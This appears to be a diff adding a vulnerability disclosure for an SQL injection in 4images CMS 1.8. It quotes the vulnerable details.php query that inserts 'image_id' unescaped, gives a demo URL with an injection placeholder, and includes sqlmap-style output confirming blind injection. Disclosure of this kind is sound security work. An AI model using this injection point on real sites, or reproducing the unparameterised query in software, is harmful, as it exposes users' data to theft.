@@ -1,0 +1,42 @@
+---------------------------------------------------------
+# Exploit Title: 4images CMS 1.8 - 'image_id' SQL Injection
+# Google Dork: N/A
+# Date: 2020-11-09
+# Exploit Author: Backdoor Security Research
+# Contact us : BSR@keemail.me
+# Vendor Homepage: https://4homepages.de
+# Software Link: https://www.4homepages.de/download-4images
+# Version: 1.8
+# Tested on: Ubuntu | XAMPP
+# CVE : N/A
+---------------------------------------------------------
+
+*Summary: 
+4images is a PHP & MySQL based system to administrate image galleries and media databases.
+
+*Impact:
+This vulnerability in the "details.php" file.
+Now see vulnerability code in this file.
+
+*In line "44 - 50":
+#
+$sql = "SELECT i.image_id, i.cat_id, i.user_id, i.image_name, i.image_description, i.image_keywords, i.image_date, i.image_active, i.image_media_file, i.image_thumb_file, i.image_download_url, i.image_allow_comments, i.image_comments, i.image_downloads, i.image_votes, i.image_rating, i.image_hits".$additional_sql.", c.cat_name".get_user_table_field(", u.", "user_name").get_user_table_field(", u.", "user_email")."
+        FROM (".IMAGES_TABLE." i,  ".CATEGORIES_TABLE." c)
+        LEFT JOIN ".USERS_TABLE." u ON (".get_user_table_field("u.", "user_id")." = i.user_id)
+        WHERE i.image_id = $image_id AND i.image_active = 1 AND c.cat_id = i.cat_id";
+$image_row = $site_db->query_firstrow($sql);
+$cat_id = (isset($image_row['cat_id'])) ? $image_row['cat_id'] : 0;
+$is_image_owner = ($image_row['user_id'] > USER_AWAITING && $user_info['user_id'] == $image_row['user_id']) ? 1 : 0;
+#
+
+*We make test on 2 parameters "cat_id & image_id"
+
+Demo:
+http://127.0.0.1/details.php?image_id=[SQL Injection]
+
+ [INFO] GET parameter 'image_id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+ [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Altibase'
+----------------------------------------------------------
+# Discovred : Unkn0wn (0x9a@tutanota.com)
+# Visit: https://t.me/BackdoorTel
+
